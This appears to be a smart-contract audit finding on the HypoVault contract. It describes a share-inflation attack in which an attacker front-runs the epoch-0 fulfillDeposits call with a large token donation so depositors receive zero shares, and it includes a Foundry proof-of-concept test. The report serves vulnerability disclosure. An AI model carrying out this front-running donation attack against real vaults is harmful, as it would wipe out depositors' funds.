  "body": "## Finding description and impact\nIn `HypoVault` contract, initial supply is `1e6` and in `fulfillDeposits` function there is `+1`:\n```solidity\n    function fulfillDeposits(\n        uint256 assetsToFulfill,\n        bytes memory managerInput\n    ) external onlyManager {\n        uint256 currentEpoch = depositEpoch;\n\n        DepositEpochState memory epochState = depositEpochState[currentEpoch];\n\n        uint256 totalAssets = accountant.computeNAV(address(this), underlyingToken, managerInput) +\n@>          1 -\n            epochState.assetsDeposited -\n            reservedWithdrawalAssets;\n        uint256 _totalSupply = totalSupply;\n\n@>      uint256 sharesReceived = Math.mulDiv(assetsToFulfill, _totalSupply, totalAssets);\n        ...\n    }            \n```\nAbove 2 settings are to initialize asset-to-share ratio to 1e6.\n\nWhen manager fulfills deposits, `totalAssets` is calculated with `accountant.computeNAV` function call.\nLooking into `accountant.computeNAV` function, you can notice that underlying token balance of vault is added to `nav` (Ofc when `skipUnderlying` is false):\n```solidity\n    function computeNAV(\n        address vault,\n        address underlyingToken,\n        bytes calldata managerInput\n    ) external view returns (uint256 nav) {\n        ...\n@>      if (!skipUnderlying) nav += IERC20Partial(underlyingToken).balanceOf(_vault);\n    }        \n```\nIf attacker donates underlying token to `vault` contract before manager fulfills deposits on epoch 0, asset-to-share ratio could be manipulated.\nThe larger the donation amount, the smaller `sharesReceived` will be, and `sharesReceived` may even become 0.\n\nIf `sharesReceived` is small, further calculations for deposit and withdraw occurs serious loss with multiplication and division operations.\nFor example, if the `totalSupply`  is nearly 1000, precision loss of share is nearly 0.1% and if the `totalSupply` is nearly 100, precision loss of share is nearly 1%. (Attack should donate 10000x of `epochState.assetsDeposited` to manipulate `totalSupply` to nearly 100. This is not such an impossible condition.)\nAnd in worst case, `sharesReceived` could be 0.\nThere is no check or validate mechanism for `sharesReceived` in `fulfillDeposits` function, so the attack is possible.\n\nLet's imagine the following scenario:\n1. Alice requests deposit of 1e18.\n2. Manager is going to fulfills deposits on epoch 0 and attacker tries front-run.\n3. Attacker donates underlying token to vault, and the amount is `1e6 * 1e18`.\n4. Manager calls `fulfillDeposits` function. In `fulfillDeposits` function, there is no mechanism to validate `sharesReceived`.\n5. `sharesReceived` is 0 and Alice can't get any share while executes deposit.\n6. Further operations of deposit and withdraw are done with serious loss due to manipulated asset-to-share ratio.",
  "proof_of_concept": "```solidity\n    function test_submissionValidity() external {\n        // Proof of Concept code demonstrating the vulnerability\n        mockAccountant.setExpectedVault(address(vault));\n\n        uint256 aliceDeposit = 1 ether;\n\n        // Alice requests deposit on epoch 0\n        vm.prank(Alice);\n        vault.requestDeposit(uint128(aliceDeposit));\n        \n        // Attacker front runs and donations\n        token.mint(address(vault), 1_000_000 ether);\n\n        // Fulfill total deposits on epoch 0\n        vm.startPrank(Manager);\n        mockAccountant.setNav(token.balanceOf(address(vault)));\n        vault.fulfillDeposits(aliceDeposit, \"\");\n        vm.stopPrank();\n\n        // Alice executes deposit but no share   \n        vm.prank(Alice);\n        vault.executeDeposit(Alice, 0);\n        \n        assertEq(vault.balanceOf(Alice), 0);\n    }\n```",
